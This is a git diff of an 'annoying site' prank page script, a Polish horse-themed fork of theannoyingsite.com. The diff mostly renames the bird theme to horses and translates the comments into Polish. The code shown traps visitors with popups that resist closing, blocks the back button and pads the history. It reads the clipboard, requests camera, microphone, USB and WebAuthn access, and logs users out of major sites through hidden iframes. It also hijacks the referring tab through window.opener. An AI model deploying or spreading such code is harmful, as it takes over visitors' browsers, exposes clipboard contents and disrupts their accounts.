@@ -1,16 +1,16 @@
 /*
-  ptoszek.pl
+  koniuch.pl
   Powered by Jaczup
 
-  My version (ptoszek.pl): 
-  - https://github.com/jaczup/ptoszek.pl
-  Original version (theannoyingsite.com): 
+  Moja wersja (koniuch.pl):
+  - https://github.com/jaczup/koniuch.pl
+  Oryginalna wersja (theannoyingsite.com):
   - https://github.com/feross/TheAnnoyingSite.com/
 
-  Contact with me: https://jaczup.pl
-  Official Discord server (maintained in Polish language), get the PTOK tag: https://dc.ptoszek.pl
+  Kontakt: https://jaczup.pl
+  Oficjalny serwer Discord (język polski), zdobądź tag KOŃ: https://dc.koniuch.pl
 
-  Contributors:
+  Kontrybutorzy:
     @jaczup - https://github.com/jaczup
     @intexpression - https://github.com/intexpression
     @dan64iel - https://github.com/dan64iel
@@ -39,10 +39,11 @@ const ART = [
 ┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊
 ┈┈┈┈╭━━━━━━╮┊☆ ┊┊
 ┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊
-┈┈☆ ┈┃╳╳╳▕▏▍▕▍▏┊┊
-┈┈╰━┫╳╳╳▕▏╰┻╯▏┊┊
+┈┈☆ ┈┃╳╳╳▕▏◣ ◢▕▏┊┊
+┈┈╰━┫╳╳╳▕▏▔▔▏┊┊
 ☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊
 ┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊
+   (  koń  )
   `,
   `
 ░░▓▓░░░░░░░░▓▓░░
@@ -58,14 +59,15 @@ const ART = [
 ░▓▒▒▒▓▓▓▓▓▓▓▒▒▓░
 ░░▓▒▒▒▒▒▒▒▒▒▒▓░░
 ░░░▓▓▓▓▓▓▓▓▓▓░░░
+     🐴 KOŃ 🐴
   `
 ]
 
 const SEARCHES = [
   'jshop',
-  'ptoszek',
-  'ptak',
-  'kanarek',
+  'koniuch',
+  'koń',
+  'rżenie konia',
   'jaczup'
 ]
 
@@ -80,16 +82,16 @@ const VIDEOS = [
   'media/videos/ajhsdfhjasdbhfjasdfs.mp4',
   'media/videos/v09044g40000cgr968jc77u1t2krb89g.mov',
   'media/videos/intro.mp4',
-  'media/videos/szybkakaczka.mp4', // added by @dan64iel
-  'media/videos/kaczuszka.mp4', //added by @imzeme
+  'media/videos/szybkikon.mp4', // added by @dan64iel
+  'media/videos/koniczek.mp4', //added by @imzeme
   'media/videos/gratulacje.mp4', //added by @GameShoot8050
-  'media/videos/puddi.mp4' //added by @MariaWasNotAvailable
+  'media/videos/galopik.mp4' //added by @MariaWasNotAvailable
 ]
 
 const FILE_DOWNLOADS = [
   'media/images/konik.jpg',
   'media/images/koniuszek.jpg',
-  'media/images/kanar.jpg',
+  'media/images/kon.jpg',
   'media/images/kasti.jpg',
   'media/images/ai.png',
   'media/images/konno.jpg',
@@ -98,18 +100,18 @@ const FILE_DOWNLOADS = [
   'media/images/smieszny.jpg', //added by @imzeme
   'media/images/hmmm.jpg', //added by @imzeme
   'media/images/kaska.jpg', //added by @MARECKIyt
-  'media/images/pies.jpg',
+  'media/images/kon2.jpg',
 ]
 
 const PHRASES = [
-  'hello my name is ptoszek, lol',
-  'birds are funny lalalalalalalallalala',
+  'hello my name is koniuch, lol',
+  'konie są zabawne hihihihihihihihihi',
   'wgl co u cb bo u mn dbr',
   'knuuurrr eksplozja',
-  'hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw',
+  'irrhaaa irrhaaa irrhaaa irrhaaa irrhaaa irrhaaa irrhaaa irrhaaa irrhaaa irrhaaa irrhaaa irrhaaa',
   'abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz',
   'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak',
-  'eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo'
+  'yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa yhaa'
 ]
 
 const LOGOUT_SITES = {
@@ -156,56 +158,55 @@ const LOGOUT_SITES = {
 }
 
 /**
- * Array to store the child windows spawned by this window.
+ * Tablica przechowująca okna potomne otwarte przez to okno.
  */
 const wins = []
 
 /**
- * Count of number of clicks  - added by @9fm
+ * Licznik liczby kliknięć - added by @9fm
  */
 
 let interactionCount = 0
 
-//Bardzo dlugi string xd, ciulowa implementacja ale to chyba lepsze niz ~ 4 miliony znakow w pliku poprostu - added by @9fm
+// Bardzo długi string xd, ciulowa implementacja ale to chyba lepsze niż ~4 miliony znaków w pliku po prostu - added by @9fm
 
-const veryLongString = repeatStringNumTimes(repeatStringNumTimes('zostałeś zptoszkowany!!1 ',100),1500) // - added by @9fm
+const veryLongString = repeatStringNumTimes(repeatStringNumTimes('zostałeś skoniowany!!1 ',100),1500) // - added by @9fm
 
 /**
- * Number of iframes injected into the page for the "super logout" functionality.
- * See superLogout().
+ * Liczba iframe'ów wstrzykniętych na stronę do funkcji "super wylogowania".
+ * Patrz superLogout().
  */
 let numSuperLogoutIframes = 0
 
 /**
- * Is this window a child window? A window is a child window if there exists a
- * parent window (i.e. the window was opened by another window so `window.opener`
- * is set) *AND* that parent is a window on the same origin (i.e. the window was
- * opened by us, not an external website)
+ * Czy to okno potomne? Okno jest potomkiem, jeśli istnieje okno rodzica
+ * (tzn. okno zostało otwarte przez inne okno, więc `window.opener` jest ustawione)
+ * *ORAZ* ten rodzic jest oknem z tego samego pochodzenia (tzn. okno zostało
+ * otwarte przez nas, a nie przez zewnętrzną stronę).
  */
 const isChildWindow = (window.opener && isParentSameOrigin()) ||
   window.location.search.indexOf('child=true') !== -1
 
 /**
- * Is this window a parent window?
+ * Czy to okno rodzica?
  */
 const isParentWindow = !isChildWindow
 
 /*
- * Run this code in all windows, *both* child and parent windows.
+ * Uruchom ten kod we wszystkich oknach, *zarówno* potomnych, jak i rodzica.
  */
 
 init()
 
 /*
- * Use `window.opener` to detect if this window was opened by another window, which
- * will be its parent. The `window.opener` variable is a reference to the parent
- * window.
+ * Użyj `window.opener`, aby wykryć, czy to okno zostało otwarte przez inne okno,
+ * które będzie jego rodzicem. Zmienna `window.opener` to referencja do okna rodzica.
  */
 if (isChildWindow) initChildWindow()
 else initParentWindow()
 
 /**
- * Initialization code for *both* parent and child windows.
+ * Inicjalizacja dla *obu* typów okien: rodzica i potomnych.
  */
 function init () {
   confirmPageUnload()
@@ -213,13 +214,13 @@ function init () {
   interceptUserInput(event => {
     interactionCount += 1
 
-    // Prevent default behavior (breaks closing window shortcuts)
+    // Zapobiegaj domyślnemu zachowaniu (psuje skróty zamykania okna)
     event.preventDefault()
     event.stopPropagation()
 
-    // 'touchstart' and 'touchend' events are not able to open a new window
-    // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
-    // a clever way to exclude touch events.
+    // Zdarzenia 'touchstart' i 'touchend' nie mogą otwierać nowego okna
+    // (przynajmniej w Chrome), więc nawet nie próbuj. Sprawdzenie `event.which !== 0`
+    // to sprytny sposób na wykluczenie zdarzeń dotykowych.
     if (event.which !== 0) openWindow()
 
     startVibrateInterval()
@@ -231,8 +232,8 @@ function init () {
     speak()
     startTheramin()
 
-    // Capture key presses on the Command or Control keys, to interfere with the
-    // "Close Window" shortcut.
+    // Przechwyć naciśnięcia klawiszy Command lub Control, aby zakłócić
+    // skrót "Zamknij okno".
     if (event.key === 'Meta' || event.key === 'Control') {
       window.print()
       requestWebauthnAttestation()
@@ -244,8 +245,8 @@ function init () {
       requestPointerLock()
 
       if (!window.ApplePaySession) {
-        // Don't request TouchID on every interaction in Safari since it blocks
-        // the event loop and stops windows from moving
+        // Nie proś o TouchID przy każdej interakcji w Safari, bo blokuje
+        // pętlę zdarzeń i zatrzymuje ruch okien
         requestWebauthnAttestation()
       }
       requestClipboardRead()
@@ -261,7 +262,7 @@ function init () {
 }
 
 /**
- * Initialization code for child windows.
+ * Inicjalizacja dla okien potomnych.
  */
 function initChildWindow () {
   registerProtocolHandlers()
@@ -282,7 +283,7 @@ function initChildWindow () {
 }
 
 /**
- * Initialization code for parent windows.
+ * Inicjalizacja dla okna rodzica.
  */
 function initParentWindow () {
   showHelloMessage()
@@ -291,7 +292,7 @@ function initParentWindow () {
   startInvisiblePictureInPictureVideo()
 
   interceptUserInput(event => {
-    // Only run these on the first interaction
+    // Uruchom to tylko przy pierwszej interakcji
     if (interactionCount === 1) {
       registerProtocolHandlers()
       attemptToTakeoverReferrerWindow()
@@ -308,11 +309,10 @@ function initParentWindow () {
 }
 
 /**
- * Sites that link to theannoyingsite.com may specify `target='_blank'` to open the
- * link in a new window. For example, Messenger.com from Facebook does this.
- * However, that means that `window.opener` will be set, which allows us to redirect
- * that window. YES, WE CAN REDIRECT THE SITE THAT LINKED TO US.
- * Learn more here: https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/
+ * Strony, które linkują do koniuch.pl, mogą podać `target='_blank'`, aby otworzyć
+ * link w nowym oknie. Wtedy `window.opener` jest ustawione, co pozwala nam
+ * przekierować to okno. TAK, MOŻEMY PRZEKIEROWAĆ STRONĘ, KTÓRA DO NAS LINKOWAŁA.
+ * Więcej tutaj: https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/
  */
 function attemptToTakeoverReferrerWindow () {
   if (isParentWindow && window.opener && !isParentSameOrigin()) {
@@ -321,13 +321,13 @@ function attemptToTakeoverReferrerWindow () {
 }
 
 /**
- * Returns true if the parent window is on the same origin. It's not enough to check
- * that `window.opener` is set, because that will also get set if a site on a
- * different origin links to theannoyingsite.com with `target='_blank'`.
+ * Zwraca true, jeśli okno rodzica jest z tego samego pochodzenia. Nie wystarczy
+ * sprawdzić, czy `window.opener` jest ustawione, bo to też się zdarzy, gdy strona
+ * z innego pochodzenia linkuje do koniuch.pl z `target='_blank'`.
  */
 function isParentSameOrigin () {
   try {
-    // May throw an exception if `window.opener` is on another origin
+    // Może rzucić wyjątkiem, jeśli `window.opener` jest z innego pochodzenia
     return window.opener.location.origin === window.location.origin
   } catch (err) {
     return false
@@ -335,9 +335,9 @@ function isParentSameOrigin () {
 }
 
 /**
- * Ask the user "are you sure you want to leave this page?". In most browsers,
- * this will not actually do anything unless the user has at least one interaction
- * with the page before they close it.
+ * Zapytaj użytkownika "czy na pewno chcesz opuścić tę stronę?". W większości
+ * przeglądarek nie zrobi to nic, chyba że użytkownik wykonał przynajmniej
+ * jedną interakcję ze stroną przed jej zamknięciem.
  */
 function confirmPageUnload () {
   window.addEventListener('beforeunload', event => {
@@ -347,8 +347,8 @@ function confirmPageUnload () {
 }
 
 /**
- * Attempt to register all possible browser-whitelisted protocols to be handled by
- * this web app instead of their default handlers.
+ * Spróbuj zarejestrować wszystkie możliwe protokoły dozwolone przez przeglądarkę,
+ * aby były obsługiwane przez tę aplikację zamiast domyślnych handlerów.
  */
 function registerProtocolHandlers () {
   if (typeof navigator.registerProtocolHandler !== 'function') return
@@ -379,13 +379,13 @@ function registerProtocolHandlers () {
   const handlerUrl = window.location.href + '/url=%s'
 
   protocolWhitelist.forEach(proto => {
-    navigator.registerProtocolHandler(proto, handlerUrl, 'Ptoszek')
+    navigator.registerProtocolHandler(proto, handlerUrl, 'Koniuch')
   })
 }
 
 /**
- * Attempt to access the user's camera and microphone, and attempt to enable the
- * torch (i.e. camera flash) if the device has one.
+ * Spróbuj uzyskać dostęp do kamery i mikrofonu użytkownika oraz spróbuj włączyć
+ * latarkę (lampę błyskową), jeśli urządzenie ją posiada.
  */
 function requestCameraAndMic () {
   if (!navigator.mediaDevices ||
@@ -409,33 +409,33 @@ function requestCameraAndMic () {
       const imageCapture = new window.ImageCapture(track)
 
       imageCapture.getPhotoCapabilities().then(() => {
-        // Let there be light!
+        // Niech się stanie światło!
         track.applyConstraints({ advanced: [{ torch: true }] })
-      }, () => { /* No torch on this device */ })
-    }, () => { /* ignore errors */ })
+      }, () => { /* Brak latarki w tym urządzeniu */ })
+    }, () => { /* ignoruj błędy */ })
   })
 }
 
 /**
- * Animating the URL with emojis
- * See: https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/
+ * Animowanie URL emoji.
+ * Zobacz: https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/
  */
 function animateUrlWithEmojis () {
   if (window.ApplePaySession) {
-    // Safari doesn't show the full URL anyway, so we can't animate it
+    // Safari i tak nie pokazuje pełnego URL, więc nie możemy go animować
     return
   }
   const rand = Math.random()
   if (rand < 0.33) {
-    animateUrlWithBabies()
+    animateUrlWithHorses()
   } else if (rand < 0.67) {
     animateUrlWithWave()
   } else {
     animateUrlWithMoons()
   }
 
-  function animateUrlWithBabies () {
-    const e = ['🏻', '🏼', '🏽', '🏾', '🏿']
+  function animateUrlWithHorses () {
+    const e = ['🐎', '🐴', '🦄', '🐎', '🐴']
 
     setInterval(() => {
       let s = ''
@@ -443,7 +443,7 @@ function animateUrlWithEmojis () {
 
       for (i = 0; i < 10; i++) {
         m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2))
-        s += '👶' + e[m]
+        s += e[m]
       }
 
       window.location.hash = s
@@ -505,8 +505,8 @@ function animateUrlWithEmojis () {
 }
 
 /**
- * Lock the user's pointer, without even being in full screen!
- * Require user-initiated event.
+ * Zablokuj wskaźnik użytkownika, nawet nie będąc w pełnym ekranie!
+ * Wymaga zdarzenia zainicjowanego przez użytkownika.
  */
 function requestPointerLock () {
   const requestPointerLockApi = (
@@ -520,8 +520,8 @@ function requestPointerLock () {
 }
 
 /**
- * Start vibrating the device at random intervals, on supported devices.
- * Requires user-initiated event.
+ * Zacznij wibrować urządzenie w losowych odstępach, na obsługiwanych urządzeniach.
+ * Wymaga zdarzenia zainicjowanego przez użytkownika.
  */
 function startVibrateInterval () {
   if (typeof window.navigator.vibrate !== 'function') return
@@ -530,7 +530,8 @@ function startVibrateInterval () {
     window.navigator.vibrate(duration)
   }, 1000)
 
-  // If the gamepad can vibrate, we will at random intervals every second. And at random strengths!
+  // Jeśli gamepad umie wibrować, będziemy to robić w losowych odstępach co sekundę.
+  // I z losową siłą!
   window.addEventListener('gamepadconnected', (event) => {
     const gamepad = event.gamepad
     if (gamepad.vibrationActuator) {
@@ -548,7 +549,8 @@ function startVibrateInterval () {
 }
 
 /**
- * Intercept all user-initiated events and call the given the function, `onInput`.
+ * Przechwytuj wszystkie zdarzenia zainicjowane przez użytkownika i wywołuj podaną
+ * funkcję, `onInput`.
  */
 function interceptUserInput (onInput) {
   document.body.addEventListener('touchstart', onInput, { passive: false })
@@ -563,8 +565,8 @@ function interceptUserInput (onInput) {
 }
 
 /**
- * Start an invisible, muted video so we have a one ready to put into
- * picture-in-picture mode on the first user-interaction.
+ * Uruchom niewidoczne, wyciszone wideo, aby mieć jedno gotowe do umieszczenia
+ * w trybie obraz w obrazie przy pierwszej interakcji użytkownika.
  */
 function startInvisiblePictureInPictureVideo () {
   const video = document.createElement('video')
@@ -579,8 +581,8 @@ function startInvisiblePictureInPictureVideo () {
 }
 
 /**
- * Active Safari's picture-in-picture feature, which let's show a video on the
- * desktop. Requires user-initiated event.
+ * Aktywuj funkcję obraz w obrazie Safari, która pozwala pokazać wideo na pulpicie.
+ * Wymaga zdarzenia zainicjowanego przez użytkownika.
  */
 function enablePictureInPicture () {
   const video = document.querySelector('video')
@@ -593,7 +595,8 @@ function enablePictureInPicture () {
 }
 
 /**
- * Focus all child windows. Requires user-initiated event.
+ * Ustaw fokus na wszystkich oknach potomnych. Wymaga zdarzenia zainicjowanego
+ * przez użytkownika.
  */
 function focusWindows () {
   wins.forEach(win => {
@@ -602,14 +605,14 @@ function focusWindows () {
 }
 
 /**
- * Open a new popup window. Requires user-initiated event.
+ * Otwórz nowe okno popup. Wymaga zdarzenia zainicjowanego przez użytkownika.
  */
 function openWindow () {
   const { x, y } = getRandomCoords()
   const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
   const win = window.open(window.location.pathname, '', opts)
 
-  // New windows may be blocked by the popup blocker
+  // Nowe okna mogą zostać zablokowane przez blokadę popupów
   if (!win) return
   wins.push(win)
 
@@ -617,17 +620,17 @@ function openWindow () {
 
   // Added by @wetraks
   win.onunload = function () {
-    // Some browsers might not support onunload, but include it for completeness
+    // Niektóre przeglądarki mogą nie obsługiwać onunload, ale zostawiamy dla kompletności
     return false;
   };
 
-  // For modern browsers
+  // Dla nowoczesnych przeglądarek
   win.addEventListener("beforeunload", function (e) {
     e.preventDefault();
     e.returnValue = "";
   });
 
-  // For older browsers
+  // Dla starszych przeglądarek
   win.onbeforeunload = function () {
     return "";
   };
@@ -635,16 +638,16 @@ function openWindow () {
 }
 
 /**
- * Hide the user's cursor!
+ * Ukryj kursor użytkownika!
  */
 function hideCursor () {
   document.querySelector('html').style = 'cursor: none;'
 }
 
 /**
- * Trigger a file download immediately. One file download is allowed *without* user
- * interaction. Further file downloads should happen in response to a user-initiated
- * event or they will be blocked.
+ * Wywołaj pobranie pliku natychmiast. Jedno pobranie pliku jest dozwolone *bez*
+ * interakcji użytkownika. Kolejne pobrania powinny odbywać się w odpowiedzi na
+ * zdarzenie zainicjowane przez użytkownika, w przeciwnym razie zostaną zablokowane.
  */
 function triggerFileDownload () {
   const fileName = getRandomArrayEntry(FILE_DOWNLOADS)
@@ -655,7 +658,7 @@ function triggerFileDownload () {
 }
 
 /**
- * Speak the given `phrase` using text-to-speech.
+ * Wypowiedz podaną `phrase` za pomocą syntezy mowy.
  */
 function speak (phrase) {
   if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
@@ -663,10 +666,10 @@ function speak (phrase) {
 }
 
 /**
- * Start an annoying theramin that changes pitch and volume depending on
- * the mouse position. Uses a Web Audio oscillator. Reauires user-initiated
- * event.
- * Based on https://github.com/feross/TheAnnoyingSite.com/pull/2
+ * Uruchom irytujące theremin, który zmienia wysokość i głośność w zależności
+ * od pozycji myszy. Używa oscylatora Web Audio. Wymaga zdarzenia zainicjowanego
+ * przez użytkownika.
+ * Na podstawie https://github.com/feross/TheAnnoyingSite.com/pull/2
  */
 function startTheramin () {
   const audioContext = new AudioContext()
@@ -703,16 +706,16 @@ function startTheramin () {
 }
 
 /**
- * Attempt to read the user's clipboard.
- * Requires user-initiated event.
+ * Spróbuj odczytać schowek użytkownika.
+ * Wymaga zdarzenia zainicjowanego przez użytkownika.
  */
 function requestClipboardRead () {
   try {
     navigator.clipboard.readText().then(
       data => {
         if (!window.ApplePaySession) {
-          // Don't alert in Safari because it blocks the event loop
-          window.alert("Successfully read data from clipboard: '" + data + "'")
+          // Nie pokazuj alertu w Safari, bo blokuje pętlę zdarzeń
+          window.alert("Udało się odczytać dane ze schowka: '" + data + "'")
         }
       },
       () => {}
@@ -721,27 +724,27 @@ function requestClipboardRead () {
 }
 
 /**
- * Request Webauthn attestation.
- * Requires user-initiated event.
+ * Poproś o atestację Webauthn.
+ * Wymaga zdarzenia zainicjowanego przez użytkownika.
  */
 function requestWebauthnAttestation () {
   try {
-    // From https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API
-    // This code is public domain, per https://developer.mozilla.org/en-US/docs/MDN/About#Copyrights_and_licenses
+    // Z https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API
+    // Ten kod jest domeną publiczną, zgodnie z https://developer.mozilla.org/en-US/docs/MDN/About#Copyrights_and_licenses
 
-    // sample arguments for registration
+    // przykładowe argumenty do rejestracji
     const createCredentialDefaultArgs = {
       publicKey: {
-      // Relying Party (a.k.a. - Service):
+      // Relying Party (czyli usługa):
         rp: {
           name: 'Acme'
         },
 
-        // User:
+        // Użytkownik:
         user: {
           id: new Uint8Array(16),
           name: 'lolica@jaczup.me',
-          displayName: 'Ptoszek Jaczupa'
+          displayName: 'Koniuch Jaczupa'
         },
 
         pubKeyCredParams: [{
@@ -753,30 +756,30 @@ function requestWebauthnAttestation () {
 
         timeout: 60000,
 
-        challenge: new Uint8Array([ // must be a cryptographically random number sent from a server
+        challenge: new Uint8Array([ // musi być kryptograficznie losową liczbą wysłaną z serwera
           0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
           0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
         ]).buffer
       }
     }
 
-    // sample arguments for login
+    // przykładowe argumenty do logowania
     const getCredentialDefaultArgs = {
       publicKey: {
         timeout: 60000,
-        // allowCredentials: [newCredential] // see below
-        challenge: new Uint8Array([ // must be a cryptographically random number sent from a server
+        // allowCredentials: [newCredential] // patrz niżej
+        challenge: new Uint8Array([ // musi być kryptograficznie losową liczbą wysłaną z serwera
           0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
           0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
         ]).buffer
       }
     }
 
-    // register / create a new credential
+    // zarejestruj / utwórz nowe poświadczenie
     navigator.credentials.create(createCredentialDefaultArgs)
       .then((cred) => {
-      // normally the credential IDs available for an account would come from a server
-      // but we can just copy them from above...
+      // normalnie identyfikatory poświadczeń dostępne dla konta pochodziłyby z serwera
+      // ale możemy je po prostu skopiować z powyższego...
         const idList = [{
           id: cred.rawId,
           transports: ['usb', 'nfc', 'ble'],
@@ -789,8 +792,8 @@ function requestWebauthnAttestation () {
 }
 
 /**
- * Request access to MIDI devices.
- * Requires user-initiated event.
+ * Poproś o dostęp do urządzeń MIDI.
+ * Wymaga zdarzenia zainicjowanego przez użytkownika.
  */
 function requestMidiAccess () {
   try {
@@ -801,14 +804,14 @@ function requestMidiAccess () {
 }
 
 /**
- * Request access to Bluetooth devices.
- * Requires user-initiated event.
+ * Poproś o dostęp do urządzeń Bluetooth.
+ * Wymaga zdarzenia zainicjowanego przez użytkownika.
  */
 function requestBluetoothAccess () {
   try {
     navigator.bluetooth.requestDevice({
-      // filters: [...] <- Prefer filters to save energy & show relevant devices.
-      // acceptAllDevices here ensures dialog can populate, we don't care with what.
+      // filters: [...] <- Preferuj filtry, aby oszczędzać energię i pokazywać istotne urządzenia.
+      // acceptAllDevices tutaj zapewnia wypełnienie okna dialogowego, nie zależy nam z czym.
       acceptAllDevices: true
     })
       .then(device => device.gatt.connect())
@@ -816,8 +819,8 @@ function requestBluetoothAccess () {
 }
 
 /**
- * Request access to USB devices.
- * Requires user-initiated event.
+ * Poproś o dostęp do urządzeń USB.
+ * Wymaga zdarzenia zainicjowanego przez użytkownika.
  */
 function requestUsbAccess () {
   try {
@@ -826,8 +829,8 @@ function requestUsbAccess () {
 }
 
 /**
- * Request access to Serial devices.
- * Requires user-initiated event.
+ * Poproś o dostęp do urządzeń szeregowych (Serial).
+ * Wymaga zdarzenia zainicjowanego przez użytkownika.
  */
 function requestSerialAccess () {
   try {
@@ -836,8 +839,8 @@ function requestSerialAccess () {
 }
 
 /**
- * Request access to HID devices.
- * Requires user-initiated event.
+ * Poproś o dostęp do urządzeń HID.
+ * Wymaga zdarzenia zainicjowanego przez użytkownika.
  */
 function requestHidAccess () {
   try {
@@ -846,7 +849,7 @@ function requestHidAccess () {
 }
 
 /**
- * Move the window around the screen and bounce off of the screen edges.
+ * Poruszaj oknem po ekranie i odbijaj je od krawędzi ekranu.
  */
 function moveWindowBounce () {
   let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
@@ -868,7 +871,7 @@ function moveWindowBounce () {
 }
 
 /**
- * Show a random troll video in the window.
+ * Pokaż losowe głupie wideo w oknie.
  */
 function startVideo () {
   const video = document.createElement('video')
@@ -882,8 +885,8 @@ function startVideo () {
 }
 
 /**
- * When a child window closes, notify the parent window so it can remove it from
- * the list of child windows.
+ * Gdy okno potomne się zamyka, powiadom okno rodzica, aby mogło je usunąć
+ * z listy okien potomnych.
  */
 function detectWindowClose () {
   window.addEventListener('unload', () => {
@@ -892,7 +895,7 @@ function detectWindowClose () {
 }
 
 /**
- * Handle a child window closing.
+ * Obsłuż zamknięcie okna potomnego.
  */
 function onCloseWindow (win) {
   const i = wins.indexOf(win)
@@ -900,7 +903,8 @@ function onCloseWindow (win) {
 }
 
 /**
- * Show the unsuspecting user a friendly hello message with a cat.
+ * Pokaż niczego niespodziewającemu się użytkownikowi przyjazną wiadomość powitalną
+ * z koniem.
  */
 function showHelloMessage () {
   const template = document.querySelector('template')
@@ -909,7 +913,7 @@ function showHelloMessage () {
 }
 
 /**
- * Remove the hello message.
+ * Usuń wiadomość powitalną.
  */
 function removeHelloMessage () {
   const helloMessage = document.querySelector('.hello-message')
@@ -917,7 +921,7 @@ function removeHelloMessage () {
 }
 
 /**
- * Change the theme color of the browser in a loop.
+ * Zmieniaj kolor motywu przeglądarki w pętli.
  */
 function rainbowThemeColor () {
   function zeroFill (width, number, pad = '0') {
@@ -948,16 +952,16 @@ function copySpamToClipboard () {
 }
 
 /**
- * Copy given text, `text`, onto the user's clipboard.
- * Requires user-initiated event.
+ * Skopiuj podany tekst, `text`, do schowka użytkownika.
+ * Wymaga zdarzenia zainicjowanego przez użytkownika.
  */
 function clipboardCopy (text) {
-  // A <span> contains the text to copy
+  // <span> zawiera tekst do skopiowania
   const span = document.createElement('span')
   span.textContent = text
-  span.style.whiteSpace = 'pre' // Preserve consecutive spaces and newlines
+  span.style.whiteSpace = 'pre' // Zachowaj kolejne spacje i nowe linie
 
-  // An <iframe> isolates the <span> from the page's styles
+  // <iframe> izoluje <span> od stylów strony
   const iframe = document.createElement('iframe')
   iframe.sandbox = 'allow-same-origin'
   document.body.appendChild(iframe)
@@ -967,7 +971,7 @@ function clipboardCopy (text) {
 
   let selection = win.getSelection()
 
-  // Firefox fails to get a selection from <iframe> window, so fallback
+  // Firefox nie potrafi pobrać zaznaczenia z okna <iframe>, więc fallback
   if (!selection) {
     win = window
     selection = win.getSelection()
@@ -994,9 +998,10 @@ function clipboardCopy (text) {
 }
 
 /**
- * Show a modal dialog at a regular interval. Modals capture focus from other OS apps and browser tabs.
- * Except in Chrome 64+, where modals can only capture focus from other OS apps,
- * but not from other tabs.
+ * Pokazuj modalne okno dialogowe w regularnych odstępach. Modale przechwytują
+ * fokus z innych aplikacji systemowych i kart przeglądarki. Z wyjątkiem Chrome 64+,
+ * gdzie modale mogą przechwytywać fokus tylko z innych aplikacji systemowych,
+ * ale nie z innych kart.
  */
 function startAlertInterval () {
   setInterval(() => {
@@ -1009,7 +1014,7 @@ function startAlertInterval () {
 }
 
 /**
- * Show an alert with 1000's of lines of cat ASCII art.
+ * Pokaż alert z tysiącami linii koniowej sztuki ASCII.
  */
 function showAlert () {
   const randomArt = getRandomArrayEntry(ART)
@@ -1018,7 +1023,7 @@ function showAlert () {
 }
 
 /**
- * Fullscreen the browser window
+ * Ustaw okno przeglądarki w tryb pełnoekranowy
  */
 function requestFullscreen () {
   const requestFullscreen = Element.prototype.requestFullscreen ||
@@ -1030,8 +1035,9 @@ function requestFullscreen () {
 }
 
 /**
- * Log the user out of top sites they're logged into, including Google.com.
- * Inspired by https://superlogout.com
+ * Wyloguj użytkownika z popularnych stron, na których jest zalogowany,
+ * w tym Google.com.
+ * Zainspirowane przez https://superlogout.com
  */
 function superLogout () {
   function cleanup (el, delayCleanup) {
@@ -1104,7 +1110,7 @@ function superLogout () {
 }
 
 /**
- * Disable the back button. If the user goes back, send them one page forward ;-)
+ * Zablokuj przycisk wstecz. Jeśli użytkownik cofnie, wyślij go o stronę do przodu ;-)
  */
 function blockBackButton () {
   window.addEventListener('popstate', () => {
@@ -1113,20 +1119,20 @@ function blockBackButton () {
 }
 
 /**
- * Fill the history with extra entries for this site, to make it harder to find
- * the previous site in the back button's dropdown menu.
+ * Wypełnij historię dodatkowymi wpisami dla tej strony, aby utrudnić znalezienie
+ * poprzedniej strony w rozwijanym menu przycisku wstecz.
  */
 function fillHistory () {
   for (let i = 1; i < 20; i++) {
     window.history.pushState({}, '', window.location.pathname + '?q=' + i)
   }
-  // Set location back to the initial location, so user does not notice
+  // Ustaw lokalizację z powrotem na początkową, aby użytkownik nie zauważył
   window.history.pushState({}, '', window.location.pathname)
 }
 
 /**
- * Get random x, y coordinates for a new window on the screen. Takes into account
- * screen size, window size, and leaves a safe margin on all sides.
+ * Pobierz losowe współrzędne x, y dla nowego okna na ekranie. Uwzględnia
+ * rozmiar ekranu, rozmiar okna i zostawia bezpieczny margines ze wszystkich stron.
  */
 function getRandomCoords () {
   const x = MARGIN +
@@ -1137,14 +1143,15 @@ function getRandomCoords () {
 }
 
 /**
- * Get a random element from a given array, `arr`.
+ * Pobierz losowy element z podanej tablicy, `arr`.
  */
 function getRandomArrayEntry (arr) {
   return arr[Math.floor(Math.random() * arr.length)]
 }
 
-/** 
- * Automates a series of Google searches in a browser window, moving the window randomly between searches. - Added by @MARECKIyt
+/**
+ * Automatyzuje serię wyszukiwań w Google w oknie przeglądarki, przesuwając okno
+ * losowo między wyszukiwaniami. - Added by @MARECKIyt
  */
 function setupSearchWindow (win) {
   if (!win) return
